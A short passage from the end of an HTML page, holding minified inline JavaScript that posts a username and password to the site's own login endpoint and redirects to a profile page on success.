XMLHttpRequest,data="username1="+inputs[0].value.trim()+"&password1="+inputs[1].value.trim(),xhr.open("POST","login",1),xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded"),xhr.onreadystatechange=()=>{4==xhr.readyState&&200==xhr.status&&(window.localStorage.removeItem("error"),error.classList.remove("visible"),inputs[0].classList.remove("error"),inputs[1].classList.remove("error"),window.location.href="./profile")},xhr.send(data))),a.preventDefault()})</script>
    </body>
</html>